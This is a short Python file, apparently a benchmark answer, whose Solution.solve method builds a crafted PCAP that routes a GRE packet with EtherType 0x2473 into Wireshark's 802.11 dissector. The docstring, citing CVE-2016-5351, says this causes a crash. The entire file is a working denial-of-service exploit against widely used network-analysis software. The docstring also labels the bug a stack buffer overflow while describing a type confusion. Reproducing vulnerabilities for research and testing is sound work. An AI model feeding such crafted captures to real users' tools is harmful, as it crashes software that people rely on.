import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in Wireshark/tshark (CVE-2016-5351).
        The vulnerability occurs when the GRE dissector passes control to the 802.11 (WLAN) dissector.
        The WLAN dissector expects an 802.11 pseudo-header, but receives the GRE pseudo-header, leading to a type confusion and crash.
        
        PoC Structure (PCAP):
        - Global Header (24 bytes) using DLT_RAW (101) to minimize overhead and skip Ethernet header.
        - Packet Header (16 bytes).
        - Packet Data (25 bytes):
            - IP Header (20 bytes): Protocol 47 (GRE).
            - GRE Header (4 bytes): Protocol 0x2473 (ETHERTYPE_IEEE_802_11).
            - Payload (1 byte): Minimal data.
        """
        
        # 1. PCAP Global Header (24 bytes)
        # Magic Number: 0xa1b2c3d4 (Little Endian)
        # Version: 2.4
        # ThisZone: 0
        # SigFigs: 0
        # SnapLen: 65535
        # Network: 101 (DLT_RAW) - Indicates raw IP frames
        global_header = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 101)

        # 2. Construct Packet Data
        # IPv4 Header
        # Version: 4, IHL: 5 (0x45)
        # Total Length: 20 (IP) + 4 (GRE) + 1 (Payload) = 25 (0x0019)
        # Protocol: 47 (0x2F) -> GRE
        ip_header = bytes([
            0x45, 0x00, 0x00, 0x19,  # Ver/IHL, TOS, Total Len
            0x00, 0x00, 0x00, 0x00,  # ID, Flags/Frag
            0x40, 0x2f, 0x00, 0x00,  # TTL, Proto (47=GRE), Checksum (0)
            0x7f, 0x00, 0x00, 0x01,  # Src: 127.0.0.1
            0x7f, 0x00, 0x00, 0x01   # Dst: 127.0.0.1
        ])

        # GRE Header
        # Flags/Ver: 0x0000
        # Protocol Type: 0x2473 (ETHERTYPE_IEEE_802_11)
        # This specific EtherType triggers the mapping in the vulnerable gre.proto table
        gre_header = bytes([0x00, 0x00, 0x24, 0x73])

        # Payload
        # Minimal payload to ensure the packet is processed
        payload = b'\x00'

        packet_data = ip_header + gre_header + payload

        # 3. PCAP Packet Header (16 bytes)
        # Timestamp Seconds (4)
        # Timestamp Microseconds (4)
        # Included Length (4)
        # Original Length (4)
        packet_header = struct.pack('<IIII', 0, 0, len(packet_data), len(packet_data))

        # Combine all parts
        return global_header + packet_header + packet_data